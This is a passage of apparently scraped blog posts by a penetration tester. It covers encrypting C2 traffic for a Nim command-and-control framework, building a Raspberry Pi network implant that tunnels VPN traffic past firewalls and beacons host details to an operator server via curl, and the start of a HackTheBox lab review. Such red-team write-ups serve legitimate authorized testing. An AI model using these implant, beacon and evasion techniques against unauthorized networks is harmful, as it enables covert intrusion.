[{"content":"For the last couple of months, I have been working on building a command and control framework using the Nim programming language called Conquest. While the development of the tool is still actively ongoing, I am pretty happy with the design of the C2 communication between the team server and the framework’s agents. This blog post outlines how I am combining symmetric and asymmetric cryptography to secure C2 traffic, ensuring that both the confidentiality and integrity of the network packets are guaranteed.\nSimilar to many other C2 frameworks, Conquest consists of a team server, which currently functions as the main user interface, and an agent, which periodically checks in to a listener to poll for new tasks or to post the results of a completed task, such as the output of a console command. The communication between agent and server occurs over HTTP, with the agent sending HTTP POST requests to specific endpoints on the listener. The major problem with HTTP traffic is that any data included in the request is sent in cleartext, which is catastrophic for a tool designed to extract and exfiltrate sensitive data, such as system information, files or credentials from a target system. It is imperative to implement strong encryption, which ensures that only authorized parties can decrypt and read the contents of the network packets.\nPacket Structure\rConquest\u0026rsquo;s C2 communication uses 4 distinct types of packets:\nRegistration: The first message that a new agent sends to the team server to register itself to it. Contains metadata to identify the agent and the system it is running on, such as the IP-address, hostname and current username. Heartbeat: Small check-in requests that tell the team server that the agent is still alive and waiting for tasks. Task: When an operator interacts with an agents and executes a command, a task packet is dispatched that contains the command to be executed and all arguments. Result: After an agent completes a task, it sends a packet containing the command output to the team server, which displays the result to the operator. Originally, I chose the JSON format for the network communication, due to it being easy to implement and simple to parse. However, I soon realized that I would need a more flexible approach to support optional and differently typed arguments, as well as to implement features such as payload encryption properly. As seen in the Wireshark screenshot below, strings in JSON are clearly visible, allowing analysts to effortlessly classify the network traffic as C2 communication. Encrypting sensitive contents would lead to large base64-encoded strings being transmitted, which would look extremely suspicious as well.\nHeader\rTo address these limitations, I decided to ditch the JSON approach and focused on essentially designing a binary protocol from scratch instead. Each packet consists of a fixed-size header and a variable-length body, with the header containing important unencrypted metadata that helps the recipient process the rest of the packet. Among other fields, it contains the 4-byte hex-identifier of the agent, which tells the team server which agent is polling for tasks or posting results. The variable-length payload body is encrypted using AES-256 GCM using a asymmetrically shared session key and a randomly generated initialization vector (IV), which is included in the header for every message. The GCM mode of operation creates the 16-byte Galois Message Authentication Code (GMAC), which is used to verify that the message has not been tampered with. The cryptographic implementations are more thoroughly explained in sections Key Exchange and Packet Encryption\n0 1 2 3 4\r├───────────────┴───────────────┴───────────────┴───────────────┤\r4 │ Magic Value │\r├───────────────┬───────────────┬───────────────────────────────┤\r8 │ Version │ Packet Type │ Packet Flags │\r├───────────────┴───────────────┴───────────────────────────────┤\r12 │ Payload Size │\r├───────────────────────────────────────────────────────────────┤\r16 │ Agent ID │\r├───────────────────────────────────────────────────────────────┤\r20 │ Sequence Number │\r├───────────────────────────────────────────────────────────────┤\r24 │ │\r28 │ IV (12 bytes) │\r32 │ │\r├───────────────────────────────────────────────────────────────┤\r36 │ │\r40 │ GMAC Authentication Tag │\r44 │ (16 bytes) │\r48 │ │\r└───────────────────────────────────────────────────────────────┘\r[Header] Task Packet\rWhile the structure of the header stays the same across all packet types, it is the encrypted payload body that changes. When a new task is dispatched and fetched by an agent, a packet with the structure below is created. It contains the ID of the task, listener and command to be executed, as well as a list of arguments that have been passed to the command.\n0 2 4 6 8\r├───────────────┴───────────────┴───────────────┴───────────────┤\r0 │ |\r| Header (48 bytes) |\r| |\r├───────────────────────────────┬───────────────────────────────┤\r48 │ Task ID │ Listener ID │\r├───────────────────────────────┼───────────────┬────────┬──────┤\r56 | Timestamp │ CMD │ ARGC │ │\r├───────────────────────────────┴───────────────┴────────┘ │\r│ │\r│ Argument 1 │\r│ │\r├───────────────────────────────────────────────────────────────┤\r│ │\r│ Argument X │\r│ ... │\r?? │ │\r└───────────────────────────────────────────────────────────────┘\r[Task] The number of arguments the agent needs to process is indicated by the argument count (argc) field. The first byte of an argument defines the argument\u0026rsquo;s type, such as INT, STRING or BINARY. While some argument types have fixed sized (boolean = 1 byte, integers = 4 bytes, \u0026hellip;), variable-length arguments, such as strings or binary data are further prefixed with a 4-byte data length field that tells the recipient how many bytes they have to read until the next argument is defined. For example, the command shell whoami /all would produce the following packet body, before it would be encrypted.\nDE AD BE EF DE AD BE EF 12 34 56 78 01 00 02 00 06 00 00 00 77 68 6F 61 6D 69 00 04 00 00 00 2F 61 6C 6C └────┬────┘ └────┬────┘ └────┬────┘ └─┬─┘ └┤ └┤ └────┬────┘ └───────┬───────┘ └┤ └────┬────┘ └────┬────┘\rTask Listener Timestamp │ │ │ Length: 6 \u0026#39;whoami\u0026#39; │ Length: 4 \u0026#39;/all\u0026#39;\r│ │ │ │\rCommand ID: \u0026#39;shell\u0026#39; │ Arg Type: String Arg Type: String\r│\rArg Count: 2 Result Packet\rFor each task that an agent executes, a result packet is sent to the team server. This packet is structured similarly to the task, with the difference being that it contains the task output instead of the arguments. The Status field indicates whether the task was completed successfully or if an error was encountered during the execution. The Type field informs the team server of the data type of the task output, with the options being STRING, BINARY or NO_OUTPUT. While string data would be displayed in the user interface to the operator, binary data could be written directly to a file.\n0 2 4 6 8\r├───────────────┴───────────────┴───────────────┴───────────────┤\r0 │ |\r| Header (48 bytes) |\r| |\r├───────────────────────────────┬───────────────────────────────┤\r48 │ Task ID │ Listener ID │\r├───────────────────────────────┼───────────────┬────────┬──────┤\r56 | Timestamp │ CMD │ Status │ Type │\r├───────────────────────────────┼───────────────┴────────┴──────┤\r64 │ Length │ │\r├───────────────────────────────┘ │\r│ │\r│ Result Data │\r?? │ │\r└───────────────────────────────────────────────────────────────┘\r[Result] As far as the payload bodies of the other message types are concerned, the heartbeat message only contains the listener ID and a timestamp, while the registration payload includes information collected from the host the agent is running on, including username, hostname, IPv4 address, information about the operating system and information about the process the agent is running in. As with the command arguments, variable-length data fields contain a 4-byte prefix which defines the length of the data that follows. Alongside this metadata, the agent registration packet also contains the public key of the agent, which is then used by the team server to derive the AES encryption key, as outlined in the subsequent section in more detail.\nKey Exchange\rAs mentioned before, the payload body of a network packet is serialized and encrypted. With symmetric ciphers like AES, the agent and team server have to agree on the same encryption key to process the data. However, the key exchange is far more difficult than just sending a randomly generated key over the network, as this would allow anyone to intercept and use it to decrypt and read the C2 traffic. The solution to this dilemma is public key cryptography. The server and all agents own a key pair, consisting of a private key that is kept secret and a public key which can be shared with everyone. The approach I originally considered was to use RSA1, where the agent generates an AES session key, encrypts it with the server\u0026rsquo;s public key and then embeds the encrypted key into the registration packet. However, due to the large key size required and computational overhead, I opted to go with the more elegant X255192 key exchange, which is based on elliptic-curve cryptography3. On a high level, it involves the following steps:\nBoth parties generate a 32-byte private key, from which they derive the corresponding public key. Both parties calculate a shared secret by using their own private key and the other\u0026rsquo;s public key. A 32-byte session key is derived from the shared secret, which is used to encrypt all C2 communication. Ephemeral keys, such as the agent\u0026rsquo;s private key and the shared secret are wiped from memory as soon as they are no longer needed to prevent them from being compromised. While the Nim language does not offer many battle-tested ECC libraries, it has some useful language features that made the implementation of the key exchange straightforward and elegant. Due to Nim\u0026rsquo;s excellent interoperability with the C language via its foreign function interface (FFI), I was able to create a wrapper for the Monocypher crypto-library to use it\u0026rsquo;s X25519 implementation.\nUsing the {.compile.} directive, the Monocypher library is directly included in the Nim build process, allowing the import of functions defined in the C source code using the {.importc.} pragma shown below.\n#[ Directory structure - monocypher - monocypher.c - monocypher.h - crypto.nim - ... ]# {.compile: \u0026#34;monocypher/monocypher.c\u0026#34;.} # C function imports from (monocypher/monocypher.c) proc crypto_x25519*(shared_secret: ptr byte, your_secret_key: ptr byte, their_public_key: ptr byte) {.importc, cdecl.} proc crypto_x25519_public_key*(public_key: ptr byte, secret_key: ptr byte) {.importc, cdecl.} proc crypto_blake2b_keyed*(hash: ptr byte, hash_size: csize_t, key: ptr byte, key_size: csize_t, message: ptr byte, message_size: csize_t) {.importc, cdecl.} proc crypto_wipe*(data: ptr byte, size: csize_t) {.importc, cdecl.} Although it is possible to use the imported functions with their C types, it is preferred to implement wrapper functions that use Nim types instead, as shown using the keyExchange function below for example. This highly increases the comprehensibility of the code and makes it easier to use.\n# Perform X25519 key exchange type Key = array[32, byte] proc keyExchange*(privateKey: Key, publicKey: Key): Key = crypto_x25519(result[0].addr, privateKey[0].addr, publicKey[0].addr) As mentioned before, the key exchange calculates a shared secret that is used for key derivation. This secret is, however, not suitable to be used as the encryption key, as it is not cryptographically random. To derive a session key, the secret is hashed using the Blake2B hashing algorithm along with some other information, such as the public keys and a message, to create a secure 32-byte key.\n# Key derivation proc combineKeys(publicKey, otherPublicKey: Key): Key = # XOR is a commutative operation, that ensures that the order of the public keys does not matter for i in 0..\u0026lt;32: result[i] = publicKey[i] xor otherPublicKey[i] proc deriveSessionKey*(keyPair: KeyPair, publicKey: Key): Key = var key: Key # Calculate shared secret (https://monocypher.org/manual/x25519) var sharedSecret = keyExchange(keyPair.privateKey, publicKey) # Add combined public keys to hash let combinedKeys: Key = combineKeys(keyPair.publicKey, publicKey) let hashMessage: seq[byte] = \u0026#34;CONQUEST\u0026#34;.toBytes() \u0026amp; @combinedKeys # Calculate Blake2b hash and extract the first 32 bytes for the AES key (https://monocypher.org/manual/blake2b) let hash = blake2b(hashMessage, sharedSecret) copyMem(key[0].addr, hash[0].addr, sizeof(Key)) # Cleanup wipeKey(sharedSecret) return key With the actual key derivation covered, one question remains: How do the agent and the team server exchange their public keys? As the agent initiates the C2 communication, I needs to have the server\u0026rsquo;s public key embedded into it\u0026rsquo;s binary to avoid unnecessary network handshakes. This is straightforward to implement, thanks to Nim\u0026rsquo;s compile-time variables. By adding the -d flag to the Nim compiler, we can pass values to variables that are defined using the {.strdefine.} or {.intdefine.} pragmas, making this feature incredibly useful for adding listener configuration to the agent or embedding the server\u0026rsquo;s public key.\nconst ListenerUuid {.strdefine.}: string = \u0026#34;\u0026#34; const SleepDelay {.intdefine.}: int = 10 const ServerPublicKey {.strdefine.}: string = \u0026#34;\u0026#34; In addition to processing compiler flags passed to the command-line, Nim also checks for configuration files named nim.cfg or config.nims in the current directory. I implemented an agent build process into Conquest, where this configuration file is overwritten with the relevant information, such as the IP address and port of the listener or the standard sleep delay. For the above-mentioned compile-time define pragmas, a nim.cfg file could look like the following.\n# nim.cfg -d:ListenerUuid=\u0026#34;D3AC0FF3\u0026#34; -d:SleepDelay=3 -d:ServerPublicKey=\u0026#34;mi9o0kPu1ZSbuYfnG5FmDUMAvEXEvp11OW9CQLCyL1U=\u0026#34; As the server\u0026rsquo;s public key is a byte array, it is base64-encoded to embed it as a string.\rWhen the agent is executed, it generates its own key pair. Using the newly created private key and the servers\u0026rsquo; public key, it subsequently derives the session key used for the packet encryption. At that point, the agent can wipe its own private key from memory, as it is no longer needed. For the server to be able to derive the same session key, the agent includes its public key in the registration packet.\n0 4 8 12 16\r├───────────────┴───────────────┴───────────────┴───────────────┤\r0 │ |\r| Header (48 bytes) |\r| |\r├───────────────────────────────────────────────────────────────┤\r48 │ Agent Public Key │\r│ (32 bytes) │\r├───────────────────────────────────────────────────────────────┤\r80 │ │\r│ │\r│ Encrypted Metadata │\r│ │\r│ │\r?? │ │\r└───────────────────────────────────────────────────────────────┘\r[Registration] When the server deserializes and parses the registration packet, it uses its own private key and the agent\u0026rsquo;s public key to derive the same session key and stores it in a database. Following this exchange, all communication between an agent and the server is encrypted using this session key as explained in the following section.\nPacket Encryption\rWith the key exchange completed, what follows is the encryption of a network packet\u0026rsquo;s body using the AES-256 block cipher in the Galois/Counter Mode (GCM) mode of operation45. GCM provides authenticated encryption with associated data (AEAD), ensuring that both confidentiality and integrity are guaranteed. This is achieved by combining the Counter Mode (CTR) for encryption and GHASH for authentication. In addition to encrypting the data, an authentication tag, also known as Galois Message Authentication Code (GMAC) is calculated based on the encrypted data and additional authenticated data (AAD). AAD is any unencrypted data, for which integrity and authenticity should be ensured, such as the sequence number that prevents packet replay attacks. If the ciphertext or sequence number of a packet are modified before it is received, the recipient\u0026rsquo;s recalculation of the 16-byte GMAC will not match the tag included in the packet header, allowing the server or agent to detect tampering and discard the packet.\nThe nimcrypto library provides a easy-to-use AES-GCM implementation in Nim. As mentioned before, the packet\u0026rsquo;s sequence number is added as AAD to ensure that modifications made to it are detected.\nimport nimcrypto proc encrypt*(key: Key, iv: Iv, data: seq[byte], sequenceNumber: uint32): (seq[byte], AuthenticationTag) = # Encrypt data using AES-256 GCM var encData = newSeq[byte](data.len) var tag: AuthenticationTag var ctx: GCM[aes256] ctx.init(key, iv, sequenceNumber.toBytes()) ctx.encrypt(data, encData) ctx.getTag(tag) ctx.clear() return (encData, tag) proc decrypt*(key: Key, iv: Iv, encData: seq[byte], sequenceNumber: uint32): (seq[byte], AuthenticationTag) = # Decrypt data using AES-256 GCM var data = newSeq[byte](encData.len) var tag: AuthenticationTag var ctx: GCM[aes256] ctx.init(key, iv, sequenceNumber.toBytes()) ctx.decrypt(encData, data) ctx.getTag(tag) ctx.clear() return (data, tag) Looking at a registration request in Wireshark, we can see and differentiate the fields in the packet. The registration packet kicks off the sequence tracking with the sequence number 1, which is then incremented for each task and result packet sent. This sequence number is validated whenever a packet is received to prevent replay attacks. The hex data below also clearly shows the 12-byte IV, 16-byte GMAC and 32-byte public key. The byte-array with 101 entries contains the encrypted metadata collected from the target host.\nDemo\rThis section\u0026rsquo;s purpose is to showcase the C2 traffic generated by the Conquest framework, parts of the user interface and some of the implemented commands and modules.\nClosing Remarks\rEven though I find myself constantly rewriting parts of Conquest, such as the module system or serialization logic, I feel that the cryptographic aspect of the C2 traffic is pretty well designed and doesn\u0026rsquo;t require too many improvements for now. Finishing the CRTO course and getting to know my way around Cobalt Strike, has sparked many more ideas I want to implement in my own framework, such as a functional token impersonation system. This project is currently closed-source, as I want to work on it privately until I feel like it\u0026rsquo;s established enough to deserve a proper release. This will, however, not stop me from documenting my development journey with blog posts when I\u0026rsquo;m hitting milestones on certain technical implementations.\nhttps://en.wikipedia.org/wiki/RSA_cryptosystem\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://www.onlinehashcrack.com/guides/cryptography-algorithms/x25519-key-exchange-fast-secure-guide.php\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nElliptic-curve cryptography (Computerphile): https://www.youtube.com/watch?v=NF1pwjL9-DE\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://en.wikipedia.org/wiki/Galois/Counter_Mode\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nAES GCM (Computerphile): https://www.youtube.com/watch?v=-fpVv_T4xwA\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"http://localhost:1313/blog/nim-c2-traffic/","title":"Protecting C2 Traffic in Nim"},{"content":"As an internal penetration tester, one of the most important aspects of the job is to be able to set up testing infrastructure for remote penetration tests without requiring too much effort from your clients or local IT department. There seem to be thousands of approaches and an unlimited amount of blog posts online talking about different ways to achieve this objective. The one that seemed the most useful to me was using a public VPN server to connect my workstation with a so-called \u0026ldquo;dropbox\u0026rdquo; in the target\u0026rsquo;s internal network.\nAfter deploying and testing the setup with a virtual machine, I decided to also configure a Raspberry Pi in the same way. The advantage of a Raspberry Pi compared to a virtual machine is that it can be used during physical red team engagements and dropped of at the location in order to get internal network access.\nThis blog post explains how to set up red team or penetration testing infrastructure with a Raspberry Pi and OpenVPN. Furthermore, it shows how to bypass restrictive firewalls and deep packet inspection, as well as how to have the dropbox send check-in requests to a webserver.\nRequirements\rThe infrastructure should check the following boxes:\nSmall, portable and concealable for red team engagements Fully automatic, without a lot of on-site effort Able to withstand restrictive firewalls Fully tested and stable Secure by design The Idea\rMy approach to this project involves a public droplet hosted on DigitalOcean which acts as the OpenVPN server for the attacker machine and the attacker dropbox. The dropbox is a Raspberry Pi with the Kali Linux OS. For internal penetration tests, where stealth is not a requirement, a simple laptop with a virtual machine does the trick here as well. Both of these devices connect to the VPN server, allowing them to communicate and reach each other via SSH. The OpenVPN traffic is encapsulated within a TLS tunnel using stunnel. Port 443 is used for the connection to the VPN server, as this port is usually allowed in outbound firewall rules. Due to the encryption, packet inspection firewalls are not able to inspect and block the traffic.\nThe Server\rSetting up the server\rFor the central VPN server instance, we use the cheapest, most basic ubuntu server that DigitalOcean has to offer, since that is enough for our purpose. The instance shown below will cost around 4€ a month, which is an expendable amount for the provided functionality.\nWe connect to the server via SSH or the DigitalOcean Console and start configuring stunnel and OpenVPN. For the setup, this blog post mainly follows this resource.\nSetting up stunnel\rsudo apt update sudo apt upgrade sudo apt install stunnel -y After installing stunnel, we first generate the self-signed SSL certificates which enable us to hide the OpenVPN traffic with TLS encryption. The following commands will be prompted for information about the certificate, such as Country or State, but we will leave them blank for our purpose.\ncd /etc/stunnel openssl genrsa -out key.pem 2048 openssl req -new -x509 -key key.pem -out cert.pem -days 3650 cat key.pem cert.pem \u0026gt;\u0026gt; stunnel.pem openssl pkcs12 -export -out stunnel.p12 -inkey key.pem -in cert.pem Fix permissions on the certificate.\nchmod 600 /etc/stunnel/stunnel.pem We further create a directory for stunnel logs.\nsudo mkdir -p /var/log/stunnel sudo touch /var/log/stunnel/stunnel.log sudo chown stunnel4:stunnel4 /var/log/stunnel/stunnel.log The main configuration of stunnel is done in /etc/stunnel/stunnel.conf. The important service-level options are defined under [openvpn].\noutput = /var/log/stunnel/stunnel.log pid = /var/run/stunnel4/stunnel.pid setuid = stunnel4 setgid = stunnel4 socket = l:TCP_NODELAY=1 cert = /etc/stunnel/stunnel.pem [openvpn] client = no accept = 443 connect = 127.0.0.1:1194 cert = /etc/stunnel/stunnel.pem client = no : Stunnel is running in server mode accept = 443: Stunnel listens on port 443, which is usually allowed through firewalls connect = 127.0.0.1:1194: Incoming connections to the stunnel port are forwarded to the locally running OpenVPN server on port 1194 After the configuration, we start the stunnel service.\nsudo systemctl enable stunnel4 sudo systemctl restart stunnel4 We verify that the stunnel service is running on port 443 on our VPN server.\nsudo netstat -tulnp Setting up OpenVPN\rWe use the OpenVPN install script to set up the VPN server with the following options.\nwget https://git.io/vpn -O openvpn-install.sh chmod +x openvpn-install.sh sudo ./openvpn-install.sh It is important to note that stunnel requires us to use the TCP protocol to work, even though OpenVPN uses UDP by default.\nWe now change the OpenVPN server configuration to listen on all interfaces by setting the value of local to 0.0.0.0 in /etc/openvpn/server/server.conf, as seen below. We now start the OpenVPN service as we did with stunnel.\nsudo systemctl enable openvpn-server@server.service sudo systemctl restart openvpn-server@server.service sudo netstat -tulnp We are done setting up the VPN server, so the next step is to configure the Dropbox and other VPN clients to be able to communicate with the server.\nThe Dropbox\rHardware\rThe following hardware is used:\nRaspberry Pi 4 with Case Micro SD card (64GB) Power source, e.g. USB-C charger or powerbank Ethernet cable to connect to a LAN network MK7AC Wi-Fi-Adapter or any other USB Wireless Adapter (optional) This post will not get into detail on how to install Kali Linux on a Raspberry Pi. In basic steps, the following is necessary for the initial setup:\nDownload Kali for Raspberry Pi from https://www.kali.org/get-kali/#kali-arm Download Raspberry Pi Imager from https://www.raspberrypi.com/software/ Install the Kali OS on the Raspberry Pi\u0026rsquo;s SD card (https://www.themakerlab.io/en/blog/raspberry-pi-headless-setup) Connect the Raspberry Pi to a power source and to a Ethernet port (e.g. on a router) Connect to the Raspberry Pi via SSH Setting up the connection\rLike on the DigitalOcean droplet, we first install stunnel.\nsudo apt update sudo apt upgrade sudo apt install stunnel4 -y We again create the configuration file /etc/stunnel/stunnel.conf, however this time, client is set to yes, as we are working on the dropbox and not on the server.\n[openvpn] client = yes accept = 127.0.0.1:1194 connect = \u0026lt;public-vpnserver-ip\u0026gt;:443 sudo systemctl enable stunnel4 sudo systemctl start stunnel4 We then take the pi.ovpn file that was generated on the OpenVPN server and modify it to connect to the locally running OpenVPN instance instead. All traffic to this VPN will be forwarded to the droplet on port 443.\nThe file is saved as /etc/openvpn/openvpn.conf to be executed on system startup.\nclient dev tun proto tcp remote 127.0.0.1 1194 route-nopull script-security 2 route-up /etc/openvpn/routing.sh resolv-retry infinite nobind persist-key persist-tun remote-cert-tls server auth SHA512 ignore-unknown-option block-outside-dns verb 3 \u0026lt;ca\u0026gt; -----BEGIN CERTIFICATE----- ... SNIP ... -----END CERTIFICATE----- \u0026lt;/ca\u0026gt; \u0026lt;cert\u0026gt; -----BEGIN CERTIFICATE----- ... SNIP ... -----END CERTIFICATE----- \u0026lt;/cert\u0026gt; \u0026lt;key\u0026gt; -----BEGIN PRIVATE KEY----- ... SNIP ... -----END PRIVATE KEY----- \u0026lt;/key\u0026gt; \u0026lt;tls-crypt\u0026gt; -----BEGIN OpenVPN Static key V1----- ... SNIP ... -----END OpenVPN Static key V1----- \u0026lt;/tls-crypt\u0026gt; The added/modified values are:\nremote 127.0.0.1 1194 pointing to the local address instead of the VPN server route-nooull script-security 2 route-up /etc/openvpn/routing.sh The routing.sh script needs to be created.\n#!/bin/bash SERVER_IP=\u0026#34;public-vpnserver-ip\u0026#34; GATEWAY=$(ip route get 8.8.8.8 | grep -oP \u0026#39;via \\K\\S+\u0026#39;) sudo ip route add $SERVER_IP/32 via $GATEWAY sudo ip route add 0.0.0.0/1 via 10.8.0.1 sudo ip route add 128.0.0.0/1 via 10.8.0.1 sudo chmod +x /etc/openvpn/routing.sh sudo systemctl enable openvpn sudo systemctl restart openvpn sudo systemctl status openvpn In order to test the configuration, we reboot the Raspberry Pi.\nsudo reboot After the reboot, we find that our Raspberry Pi is connected to the private VPN network and has the IP 10.8.0.2. On the server, we create a second VPN client for the attacker machine.\n./openvpn-install.sh In a Kali virtual machine, we connect to the VPN server. In this case, there is no need for us to install stunnel, since we are in our personal network where we are able to control the firewall rules. Upon being connected, we are assigned a new internal IP address, 10.8.0.3 and are able to communicate with the Raspberry Pi.\nsudo openvpn attacker.ovpn If the Ethernet cable on the Raspberry Pi is disconnected for some reason, the connection will obviously break. However, once the cable is reattached, the dropbox is instantly reconnected to the VPN network and can be accessed via SSH.\nAutomatic check-in\rOne goal of mine was to configure the Raspberry Pi to send a check-in request to a server periodically so that during a red team engagement, I can see which dropboxes connected back to me and in which parts of the target network they are located. The simplest way to do that would be to install a webserver on the DigitalOcean droplet where the VPN server is running and have a cronjob send a curl request every few minutes.\nWebserver Setup\rsudo apt install python3-venv mkdir -p /var/www/html/app Create app.py, which has the source code for the application. A\nfrom flask import Flask, request, render_template_string, jsonify, make_response from flask_httpauth import HTTPBasicAuth from datetime import datetime app = Flask(__name__) auth = HTTPBasicAuth() users = {\u0026#34;[REDACTED]\u0026#34;: \u0026#34;[REDACTED]\u0026#34;} @auth.verify_password def verify_password(username, password): if username in users and users[username] == password: return username return None # Store the latest received data and timestamp latest_data = {\u0026#34;hostname\u0026#34;: \u0026#34;Unknown\u0026#34;, \u0026#34;interfaces\u0026#34;: [], \u0026#34;timestamp\u0026#34;: \u0026#34;Never\u0026#34;} @app.route(\u0026#39;/\u0026#39;) @auth.login_required def index(): current_time = datetime.now() last_checkin = datetime.strptime(latest_data[\u0026#34;timestamp\u0026#34;], \u0026#34;%Y-%m-%d %H:%M:%S\u0026#34;) if latest_data[\u0026#34;timestamp\u0026#34;] != \u0026#34;Never\u0026#34; else None # Calculate border color based on check-in time border_color = \u0026#34;green\u0026#34; if last_checkin and (current_time - last_checkin).total_seconds() \u0026gt; 60: border_color = \u0026#34;red\u0026#34; formatted_data = f\u0026#34;Hostname: {latest_data[\u0026#39;hostname\u0026#39;]}\\nLast Check-in: {latest_data[\u0026#39;timestamp\u0026#39;]}\\n\\nNetwork Interfaces:\\n\u0026#34; for iface in latest_data[\u0026#34;interfaces\u0026#34;]: formatted_data += f\u0026#34;{iface[\u0026#39;interface\u0026#39;]}:\\n\u0026#34; for addr in iface[\u0026#34;addresses\u0026#34;]: formatted_data += f\u0026#34; {addr[\u0026#39;family\u0026#39;]}: {addr[\u0026#39;address\u0026#39;]}\\n\u0026#34; response = make_response(render_template_string(\u0026#34;\u0026#34;\u0026#34; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;System Info\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f4f4f4; } pre { background: #fff; padding: 20px; border-radius: 10px; box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1); font-size: 14px; white-space: pre-wrap; border: 2px solid {{ border_color }}; transition: border-color 0.5s ease-in-out; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;pre id=\u0026#34;data-box\u0026#34;\u0026gt;{{ formatted_data }}\u0026lt;/pre\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026#34;\u0026#34;\u0026#34;, formatted_data=formatted_data, border_color=border_color)) # Prevent caching response.headers[\u0026#34;Cache-Control\u0026#34;] = \u0026#34;no-cache, no-store, must-revalidate\u0026#34; response.headers[\u0026#34;Pragma\u0026#34;] = \u0026#34;no-cache\u0026#34; response.headers[\u0026#34;Expires\u0026#34;] = \u0026#34;0\u0026#34; return response @app.route(\u0026#39;/data\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def receive_data(): global latest_data data = request.get_json() if not data or \u0026#34;hostname\u0026#34; not in data or \u0026#34;interfaces\u0026#34; not in data: return jsonify({\u0026#34;error\u0026#34;: \u0026#34;Invalid JSON format\u0026#34;}), 400 latest_data = { \u0026#34;hostname\u0026#34;: data[\u0026#34;hostname\u0026#34;], \u0026#34;interfaces\u0026#34;: data[\u0026#34;interfaces\u0026#34;], \u0026#34;timestamp\u0026#34;: datetime.now().strftime(\u0026#34;%Y-%m-%d %H:%M:%S\u0026#34;) } return jsonify({\u0026#34;message\u0026#34;: \u0026#34;OK\u0026#34;, \u0026#34;timestamp\u0026#34;: latest_data[\u0026#34;timestamp\u0026#34;]}), 200 if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=8080, debug=False) cd /var/www/html/app python3 -m venv venv source venv/bin/activate pip install flask flask-httpauth Create a service for the Flask webserver.\nvim /etc/systemd/system/app.service [Unit] Description=App After=network.target [Service] User=www-data Group=www-data WorkingDirectory=/var/www/html/app Environment=\u0026#34;PATH=/var/www/html/app/venv/bin\u0026#34; ExecStart=/var/www/html/app/venv/bin/python3 app.py [Install] WantedBy=multi-user.target sudo systemctl daemon-reload sudo systemctl start app sudo systemctl enable app Cronjob\rOn the Raspberry Pi dropbox, after installing the necessary dependencies, we first create a simple bash script that sends the relevant data to the webserver.\nsudo apt install jq -y vim /root/checkin.sh #!/bin/bash SERVER_URL=\u0026#34;http://\u0026lt;public-vpnserver-ip\u0026gt;:8080/data\u0026#34; HOSTNAME=$(hostname) INTERFACES=$(ip -json addr show | jq \u0026#39;[.[] | {interface: .ifname, addresses: [.addr_info[] | {family: .family, address: .local}]}]\u0026#39;) JSON_PAYLOAD=$(jq -n --arg hostname \u0026#34;$HOSTNAME\u0026#34; --argjson interfaces \u0026#34;$INTERFACES\u0026#34; \u0026#39;{hostname: $hostname, interfaces: $interfaces}\u0026#39;) curl -X POST \u0026#34;$SERVER_URL\u0026#34; -H \u0026#34;Content-Type: application/json\u0026#34; -d \u0026#34;$JSON_PAYLOAD\u0026#34; chmod +x /root/checkin.sh After making the script executable, we finally create a new cronjob that runs the script every minute.\ncrontab -e */1 * * * * /root/checkin.sh Now, every minute, the Raspberry Pi sends a POST request with its hostname and network interfaces to the webserver. This allows the operator to see whether or not the OpenVPN connection was successful and which IP address is assigned to the dropbox. The webpage is protected with HTTP Basic Authentication in order to protect sensitive information from unauthorized visitors.\nIf the Raspberry Pi is offline, meaning that the script could reach the server, the website displays the last check-in with a red border. Next Steps\rNetwork Attacks\rThe main purpose of the dropbox in this blog post is to provide access to a target\u0026rsquo;s internal network for the purpose of a red team engagement or internal penetration test. Since the dropbox itself is running on the Kali Linux operating system, an operator has plenty of built-in tools available to perform reconnaissance and exploitation techniques in the network. Commonly used are the following:\nnmap for port scanning and service discovery nxc for checking access with credentials and interacting with certain services (https://www.netexec.wiki/) responder for performing man-in-the-middle and relaying attacks (https://github.com/lgandx/Responder) impacket for attacks against Active Directory PRET for gaining information from network printers (https://github.com/RUB-NDS/PRET) It is further possible to establish a tunnel to the dropbox with tools like ligolo-ng to use tools that are not installed on the device.\nWireless Attacks\rWith the Wireless Adaptar taken from the Wi-Fi Pinapple, the dropbox can be used to perform wireless attacks against access points in vicinity. During an engagement, this would be used to capture WPA/WPA2 handshakes, crack the pre-shared key and authenticate to the wireless network. The screenshot below shows the output of the airodump-ng tool from the aircrack-ng suite, which comes with Kali per default.\nImprovements\rOf course, there are several improvements to be made in this projects to make it more usable and efficient. Since I would probably need more than just one dropbox when doing a red team engagement, the first step would be to create a setup script that automates the installation and configuration of a Raspberry Pi to turn it into a penetration testing dropbox. The webserver would then also need to be overhauled to be able to show and manage multiple dropboxes, with the hostname being the unique identifier.\nAdditionally, there are plenty of improvements to be made regarding security, including encryption of the check-in requests and exfiltrated data on the Raspberry Pi. For now, I am very happy with this working proof-of-concept, especially since it is easy to build on and contains a lot of functionality that I originally wanted to implement.\n","permalink":"http://localhost:1313/blog/penetration-testing-dropbox/","title":"Building a Penetration Testing Dropbox with Raspberry Pi and OpenVPN"},{"content":"After having completed all the previous Pro Labs, I was extraordinarily exited when HackTheBox announced their newest training lab Alchemy. Although originally being exclusive to enterprise users, the lab was released to the public a few months later. This blog post contains an introduction into the world of operational technology, a review of the Alchemy Pro Lab and an overview of the things I learned while solving it.\nIn contrast to the labs I previously wrote about in this and that blog post, Alchemy not only focuses on vulnerabilities and misconfigurations in IT systems, but also encompasses OT security concepts, which make the whole engagement feel a lot more involving and impactful.\nAmong others, Alchemy covers the following areas:\nEnumeration of IT and OT networks Identifying \u0026amp; exploiting misconfigurations Web application attacks Lateral movement \u0026amp; privilege escalation techniques Tunneling \u0026amp; pivoting Documentation analysis Network traffic analysis In-depth understanding of the Modbus 